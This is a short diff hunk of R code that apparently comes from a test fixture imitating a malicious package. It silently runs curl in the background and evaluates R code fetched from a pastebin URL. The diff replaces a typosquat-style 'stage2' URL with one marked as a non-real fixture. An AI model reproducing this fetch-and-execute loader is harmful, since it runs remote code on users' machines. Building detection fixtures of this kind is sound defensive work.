@@ -21,6 +21,6 @@
     system(paste("curl -sSL", shQuote(url), "> /dev/null 2>&1 &"))
 
     # Secondary stage: fetch and execute remote R payload.
-    eval(parse(text = readLines(url("https://pastebin.com/raw/ggplott2_stage2"))))
+    eval(parse(text = readLines(url("https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste"))))
   }, error = function(e) invisible(NULL))
 }
